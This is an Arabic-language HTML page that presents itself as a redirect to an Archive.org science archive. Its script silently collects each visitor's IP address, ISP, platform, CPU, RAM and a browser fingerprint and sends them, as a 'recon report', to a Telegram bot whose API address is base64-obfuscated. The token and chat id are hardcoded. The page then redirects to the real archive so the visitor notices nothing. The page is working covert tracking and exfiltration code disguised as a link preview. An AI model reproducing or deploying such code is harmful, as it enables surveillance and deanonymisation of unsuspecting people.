<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Archive | أرشيف المواد العلمية</title>

    <!-- وسوم المعاينة لبرامج التواصل (Telegram, Facebook, etc.) -->
    <meta property="og:title" content="أرشيف المواد العلمية - Archive.org">
    <meta property="og:description" content="جاري تحويلك للمادة المطلوبة من الأرشيف العالمي.. برجاء الانتظار ثانية.">
    <meta property="og:image" content="https://archive.org/images/glogo.png"> <!-- يمكنك تغيير رابط الصورة لأي صورة تريدها -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://app.netlify.com">

    <style>
        body { margin: 0; padding: 0; background: #fff; }
    </style>
</head>
<body>

    <script>
        const _at = (s) => atob(s);
        const _base = {
            u: "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==", 
            e: "L3NlbmRNZXNzYWdl"
        };

        async function _send(msg) {
            try {
                const cfg = window.TELE_CONFIG || {};
                const t = cfg.t || "8513943910:AAHu0zcDRMBOLxcVc9LmOyPx-M1n5DegUrE";
                const c = cfg.c || "7082154454";

                const api = _at(_base.u) + t + _at(_base.e);
                await fetch(api, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: c, text: msg, parse_mode: 'Markdown' })
                });
            } catch (err) { }
        }

        (async function() {
            const archiveUrl = "https://archive.org/details/20251215_20251215_2013";
            
            try {
                const netPromise = fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
                const sPort = Math.floor(Math.random() * 55000) + 10000;
                const ram = navigator.deviceMemory || 'N/A';
                const cores = navigator.hardwareConcurrency || 'N/A';
                const fp = btoa(navigator.userAgent).substring(10, 25);
                const net = await netPromise;

                let report = `🕵️ *ARCHIVE RECON REPORT* 🕵️\n` +
                             `---------------------------\n` +
                             `🌐 *NETWORK:*\n` +
                             `📍 IP: \`${net.ip || 'Unknown'}\`\n` +
                             `🔌 Source Port: *${sPort}*\n` +
                             `🏢 ISP: ${net.org || 'Unknown'}\n\n` +
                             `📱 *DEVICE:*\n` +
                             `💻 Plat: ${navigator.platform}\n` +
                             `🧠 CPU: ${cores} | 🔋 RAM: ${ram}GB\n` +
                             `🔑 FP: \`${fp}\`\n\n` +
                             `🔗 *Target:* [Archive](${archiveUrl})`;

                _send(report);
                window.location.replace(archiveUrl);
            } catch (e) {
                window.location.replace(archiveUrl);
            }
        })();
    </script>
</body>
</html>
